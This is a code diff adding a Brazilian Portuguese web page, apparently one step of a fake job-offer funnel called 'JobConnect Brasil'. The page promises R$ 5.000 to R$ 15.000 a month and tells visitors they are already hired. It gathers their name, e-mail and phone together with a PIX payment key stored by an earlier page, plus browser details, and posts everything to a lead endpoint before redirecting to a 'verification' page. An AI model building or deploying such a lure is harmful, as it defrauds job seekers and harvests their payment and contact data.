@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JobConnect Brasil - Cadastro</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 600px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 30px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+            animation: slideUp 0.8s ease;
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .header {
+            background: linear-gradient(135deg, #27ae60 0%, #2ecc71 100%);
+            padding: 40px;
+            text-align: center;
+            color: white;
+            position: relative;
+        }
+
+        .header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+            animation: pulse 3s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+
+        .check-icon {
+            width: 80px;
+            height: 80px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 40px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            position: relative;
+            z-index: 1;
+        }
+
+        .header h1 {
+            font-size: 2em;
+            margin-bottom: 10px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .header p {
+            font-size: 1.1em;
+            opacity: 0.9;
+            position: relative;
+            z-index: 1;
+        }
+
+        .content {
+            padding: 40px;
+        }
+
+        .success-banner {
+            background: linear-gradient(135deg, #ffd700 0%, #ffed4a 100%);
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            margin-bottom: 30px;
+            animation: glow 2s infinite;
+        }
+
+        @keyframes glow {
+            0%, 100% { box-shadow: 0 0 20px rgba(255,215,0,0.5); }
+            50% { box-shadow: 0 0 40px rgba(255,215,0,0.8); }
+        }
+
+        .success-banner h2 {
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .success-banner p {
+            color: #666;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: bold;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 1em;
+            transition: all 0.3s;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 20px rgba(102,126,234,0.1);
+        }
+
+        .form-group input.error {
+            border-color: #e74c3c;
+            animation: shake 0.5s;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+
+        .benefits {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .benefit-item {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+        }
+
+        .benefit-item i {
+            font-size: 2em;
+            color: #667eea;
+        }
+
+        .benefit-item p {
+            margin-top: 5px;
+            color: #666;
+            font-size: 0.9em;
+        }
+
+        .btn-cadastrar {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 1.3em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .btn-cadastrar:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(102,126,234,0.4);
+        }
+
+        .btn-cadastrar:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 30px;
+        }
+
+        .loading.active {
+            display: block;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading p {
+            margin-top: 15px;
+            color: #666;
+        }
+
+        .error-message {
+            display: none;
+            background: #e74c3c;
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .error-message.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .terms {
+            text-align: center;
+            margin-top: 20px;
+            color: #999;
+            font-size: 0.85em;
+        }
+
+        .terms a {
+            color: #667eea;
+            text-decoration: none;
+        }
+
+        .footer {
+            background: #333;
+            color: white;
+            padding: 20px;
+            text-align: center;
+            font-size: 0.9em;
+        }
+
+        @media (max-width: 768px) {
+            .benefits {
+                grid-template-columns: 1fr;
+            }
+            
+            .header h1 {
+                font-size: 1.5em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="check-icon">✅</div>
+            <h1>Pix ativado com sucesso!</h1>
+            <p>Você já faz parte da nossa equipe</p>
+        </div>
+
+        <div class="content">
+            <div class="success-banner">
+                <h2>🎉 PARABÉNS! 🎉</h2>
+                <p>Agora você faz parte do time JobConnect Brasil</p>
+                <p style="font-size: 1.2em; margin-top: 10px; font-weight: bold;">
+                    💰 GANHE MAIS: R$ 5.000 - R$ 15.000/mês
+                </p>
+            </div>
+
+            <div class="benefits">
+                <div class="benefit-item">
+                    <i>💰</i>
+                    <p>Ganhe até R$ 15.000/mês</p>
+                </div>
+                <div class="benefit-item">
+                    <i>🏠</i>
+                    <p>Trabalhe de casa</p>
+                </div>
+                <div class="benefit-item">
+                    <i>📱</i>
+                    <p>Suporte 24 horas</p>
+                </div>
+                <div class="benefit-item">
+                    <i>🎯</i>
+                    <p>Bônus semanais</p>
+                </div>
+            </div>
+
+            <h3 style="text-align: center; margin-bottom: 25px; color: #333;">
+                Complete seu cadastro para começar a ganhar
+            </h3>
+
+            <div class="form-group">
+                <label>👤 Nome de Usuário</label>
+                <input type="text" id="username" placeholder="Digite seu nome de usuário" maxlength="50">
+            </div>
+
+            <div class="form-group">
+                <label>📧 E-mail</label>
+                <input type="email" id="email" placeholder="Digite seu melhor e-mail" maxlength="100">
+            </div>
+
+            <div class="form-group">
+                <label>📱 Seu Número</label>
+                <input type="tel" id="phone" placeholder="(DDD) 9XXXX-XXXX" maxlength="15">
+            </div>
+
+            <button class="btn-cadastrar" id="cadastrarBtn" onclick="cadastrar()">
+                🚀 CADASTRAR AGORA
+            </button>
+
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>Cadastrando seus dados...</p>
+                <p style="font-size: 0.9em; color: #999;">Não feche esta página</p>
+            </div>
+
+            <div class="error-message" id="errorMessage">
+                ❌ Erro ao cadastrar. Verifique seus dados e tente novamente.
+            </div>
+
+            <div class="terms">
+                Ao cadastrar, você aceita nossos 
+                <a href="#">Termos de Uso</a> e 
+                <a href="#">Política de Privacidade</a>
+            </div>
+        </div>
+
+        <div class="footer">
+            © 2026 JobConnect Brasil - Todos os direitos reservados
+        </div>
+    </div>
+
+    <script>
+// Recuperar chave PIX da página anterior
+const pixKey = localStorage.getItem('pixKey');
+console.log('Chave PIX:', pixKey);
+
+
+function cadastrar() {
+
+    const username = document.getElementById('username').value.trim();
+    const email = document.getElementById('email').value.trim();
+    const phone = document.getElementById('phone').value.trim();
+
+    const btn = document.getElementById('cadastrarBtn');
+    const loading = document.getElementById('loading');
+    const error = document.getElementById('errorMessage');
+
+
+    let hasError = false;
+
+
+    // Validação nome
+    if (username.length < 3) {
+        document.getElementById('username').classList.add('error');
+        hasError = true;
+    } else {
+        document.getElementById('username').classList.remove('error');
+    }
+
+
+    // Validação email
+    if (!email.includes('@') || !email.includes('.')) {
+        document.getElementById('email').classList.add('error');
+        hasError = true;
+    } else {
+        document.getElementById('email').classList.remove('error');
+    }
+
+
+    // Validação telefone
+    if (phone.length < 10) {
+        document.getElementById('phone').classList.add('error');
+        hasError = true;
+    } else {
+        document.getElementById('phone').classList.remove('error');
+    }
+
+
+
+    if (hasError) {
+
+        error.classList.add('active');
+        error.textContent = '❌ Preencha todos os campos corretamente';
+
+        setTimeout(() => {
+            error.classList.remove('active');
+        }, 3000);
+
+        return;
+    }
+
+
+
+    // Mostrar carregamento
+    btn.disabled = true;
+    btn.textContent = 'CADASTRANDO...';
+    loading.classList.add('active');
+    error.classList.remove('active');
+
+
+
+    // Criar dados do usuário
+    const userData = {
+
+        username: username,
+        email: email,
+        phone: phone,
+        pixKey: pixKey,
+
+        timestamp: new Date().toISOString(),
+
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language
+    };
+
+
+
+    // Salvar no navegador
+    localStorage.setItem(
+        'userData',
+        JSON.stringify(userData)
+    );
+
+
+
+    // Aguarda processamento
+    setTimeout(() => {
+
+
+        loading.classList.remove('active');
+
+        btn.textContent = '✅ CADASTRADO!';
+
+
+
+        // Enviar para servidor
+        enviarCadastroParaServidor(userData);
+
+
+
+        // Ir para próxima página
+        setTimeout(() => {
+
+            window.location.href = 'verificacao.html';
+
+        }, 1500);
+
+
+
+    }, 2500);
+
+}
+
+
+
+
+
+// Enviar cadastro para servidor
+async function enviarCadastroParaServidor(userData) {
+
+    try {
+
+
+        const response = await fetch('/api/lead', {
+
+            method: 'POST',
+
+            headers: {
+
+                'Content-Type': 'application/json'
+
+            },
+
+
+            body: JSON.stringify({
+
+                username: userData.username,
+
+                email: userData.email,
+
+                phone: userData.phone,
+
+                pix_key: userData.pixKey,
+
+                source: 'cadastro',
+
+                step: 2,
+
+                user_agent: navigator.userAgent
+
+            })
+
+        });
+
+
+
+        const result = await response.json();
+
+
+        console.log(
+            'Cadastro enviado:',
+            result
+        );
+
+
+        return result;
+
+
+
+    } catch (err) {
+
+
+        console.log(
+            'Erro ao enviar cadastro:',
+            err
+        );
+
+
+        return null;
+
+    }
+
+}
+
+
+
+
+
+// Máscara telefone
+document.getElementById('phone').addEventListener('input', function(e) {
+
+
+    let value = e.target.value.replace(/\D/g, '');
+
+
+    if (value.length > 11) {
+
+        value = value.slice(0, 11);
+
+    }
+
+
+
+    if (value.length > 7) {
+
+
+        value = `(${value.slice(0,2)}) ${value.slice(2,7)}-${value.slice(7)}`;
+
+
+    } else if (value.length > 2) {
+
+
+        value = `(${value.slice(0,2)}) ${value.slice(2)}`;
+
+
+    } else if (value.length > 0) {
+
+
+        value = `(${value}`;
+
+
+    }
+
+
+
+    e.target.value = value;
+
+
+});
+
+    </script>
+</body>
+</html>
+
